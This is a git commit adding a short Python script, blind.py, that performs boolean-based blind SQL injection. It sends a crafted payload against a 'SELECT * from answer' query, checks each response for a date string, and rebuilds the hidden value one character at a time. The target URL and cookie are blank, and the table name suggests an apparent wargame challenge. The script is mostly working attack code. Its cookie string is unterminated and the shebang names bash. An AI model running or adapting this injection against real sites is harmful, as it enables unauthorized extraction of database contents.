e5c8169ea62bd5654993d7e88fe41524e3292be6
CHOI-JINHO04 <57424137+CHOI-JINHO04@users.noreply.github.com>
2020-08-17 19:13:46 +0900

    Create blind.py
    light version

---
+++ blind.py
@@ -0,0 +1,30 @@
+# /usr/bin/bash
+# made by jackson
+# input url, cookie, blind sql injeciton payload
+#
+
+import requests
+import re
+
+
+s = []
+url1 = "http://"
+headers = {'cookie':'}
+for i in range(1,5):
+	for j in range(33,127):
+		url2 = "%'and(ascii(substr((SELECT*from answer),"+str(i)+",1))="+str(j)+")and'1%'='1"
+		#data = {"user_name":"%' and (ascii(substr((SELECT * from answer),"+str(i)+",1)) = "+str(j)+") and '1%'='1"}
+		fi_url = url1+url2
+		req = requests.get(url=fi_url,headers=headers)
+		response = req.text
+		f = re.findall("2019-08-20", response)
+		if (f):
+			print (chr(j))
+			s.append(chr(j))
+			break
+			#s.append(f)
+			#break
+		else:
+			continue
+			#continue
+
